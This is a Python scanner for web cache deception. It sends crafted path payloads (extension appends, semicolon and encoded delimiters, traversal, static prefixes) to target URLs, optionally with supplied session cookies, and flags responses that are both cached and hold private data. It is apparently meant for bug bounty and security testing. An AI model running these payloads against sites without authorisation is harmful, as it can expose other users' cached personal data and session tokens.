#!/usr/bin/env python3
"""
Web Cache Deception scanner.

Based on PortSwigger "Gotta Cache 'em All" (Black Hat 2024).
Idea: parser discrepancy between CDN and origin causes user-specific
data to be cached and served to other users.

Common patterns:
- /account.css → CDN sees .css extension and caches; origin returns user data
- /account/foo.css → some servers strip extension, return /account
- /account;.css, /account?.css, /account#.css — delimiter tricks
- /account/x/../../style.css — path normalization
- Static path injection: /static/account → some routes match /account

Usage:
    python3 cache_deception.py --url https://api.example.com/account --output ./out
    python3 cache_deception.py --url-list urls.txt --output ./out
"""

import argparse
import json
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, urlunparse

import requests

PAYLOADS = [
    # Extension append
    ("/{path}.css", "extension append"),
    ("/{path}.js", "extension append"),
    ("/{path}.png", "extension append"),
    ("/{path}.jpg", "extension append"),
    ("/{path}.svg", "extension append"),
    # Path traversal-style
    ("/{path}/x.css", "path traversal extension"),
    ("/{path}/aa/..%2faa.css", "encoded traversal"),
    # Delimiter
    ("/{path};.css", "semicolon delimiter"),
    ("/{path}%3b.css", "encoded semicolon"),
    ("/{path}/.css", "trailing slash extension"),
    ("/{path}#.css", "fragment delimiter"),
    ("/{path}?.css", "query delimiter"),
    # Static path prefix
    ("/static{path}", "static prefix"),
    ("/assets{path}", "assets prefix"),
    ("/cdn{path}", "cdn prefix"),
    # Double encoding
    ("/{path}%252fstyle.css", "double encoded"),
]

CACHE_HEADERS = ["X-Cache", "CF-Cache-Status", "X-Cache-Status",
                  "X-Served-By", "Age", "X-Cache-Hits", "Akamai-Cache-Status"]
SENSITIVE_INDICATORS = ["email", "user_id", "session", "csrf", "token",
                         "@gmail.com", "@yahoo.com", "<account", "balance",
                         "username", "first_name", "private"]


def is_cached(headers: dict) -> tuple[bool, str]:
    """Check cache hit indicators."""
    for h in CACHE_HEADERS:
        v = headers.get(h, "") or headers.get(h.lower(), "")
        if v:
            v_lower = v.lower()
            if "hit" in v_lower:
                return True, f"{h}: {v}"
            if h.lower() == "age" and v.isdigit() and int(v) > 0:
                return True, f"{h}: {v}"
    return False, ""


def has_sensitive_data(text: str) -> list[str]:
    text_lower = text[:50_000].lower()
    return [ind for ind in SENSITIVE_INDICATORS if ind in text_lower]


def test_url(url: str, session: requests.Session) -> dict:
    """Run all WCD payloads against one URL."""
    parsed = urlparse(url)
    base_path = parsed.path.lstrip("/")

    print(f"[*] Baseline GET {url}")
    try:
        baseline = session.get(url, timeout=15, allow_redirects=False)
    except Exception as e:
        return {"url": url, "error": str(e)}

    if baseline.status_code in (401, 403):
        print("    needs auth — provide cookies via --cookies")

    baseline_sensitive = has_sensitive_data(baseline.text)
    if not baseline_sensitive:
        return {"url": url, "skipped": "no sensitive data in baseline"}

    print(f"    sensitive markers: {baseline_sensitive}")

    findings = []
    for payload_template, technique in PAYLOADS:
        crafted_path = payload_template.format(path=base_path)
        crafted_url = urlunparse((
            parsed.scheme, parsed.netloc, crafted_path,
            parsed.params, parsed.query, parsed.fragment,
        ))
        try:
            r = session.get(crafted_url, timeout=10, allow_redirects=False)
        except Exception:
            continue

        if r.status_code != 200:
            continue

        cached, cache_evidence = is_cached(r.headers)
        sensitive_in_response = has_sensitive_data(r.text)

        if cached and sensitive_in_response:
            findings.append({
                "technique": technique,
                "crafted_url": crafted_url,
                "cache_evidence": cache_evidence,
                "sensitive_markers": sensitive_in_response,
                "severity": "high",
            })
            print(f"    [!!] CACHED + SENSITIVE: {technique} → {crafted_url}")
        elif cached:
            findings.append({
                "technique": technique,
                "crafted_url": crafted_url,
                "cache_evidence": cache_evidence,
                "severity": "medium",
                "note": "cached but no sensitive markers detected",
            })

        time.sleep(0.3)

    return {
        "url": url,
        "baseline_status": baseline.status_code,
        "baseline_sensitive_markers": baseline_sensitive,
        "tested_payloads": len(PAYLOADS),
        "findings": findings,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url")
    ap.add_argument("--url-list", help="Newline-separated list")
    ap.add_argument("--cookies", help='Cookie header value (eg. "sess=abc; uid=1")')
    ap.add_argument("--output", required=True)
    args = ap.parse_args()

    out = Path(args.output)
    out.mkdir(parents=True, exist_ok=True)

    session = requests.Session()
    session.headers.update({"User-Agent": "BBT/1.0"})
    if args.cookies:
        session.headers["Cookie"] = args.cookies

    targets = []
    if args.url:
        targets.append(args.url)
    if args.url_list:
        targets.extend(l.strip() for l in Path(args.url_list).read_text().splitlines() if l.strip())

    if not targets:
        sys.exit("Need --url or --url-list")

    results = {"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
               "targets": []}
    for url in targets:
        r = test_url(url, session)
        results["targets"].append(r)

    out_file = out / "cache_deception.json"
    out_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))
    total_findings = sum(len(t.get("findings", [])) for t in results["targets"])
    print(f"\n[+] Total findings: {total_findings}")
    print(f"[+] Saved: {out_file}")


if __name__ == "__main__":
    main()
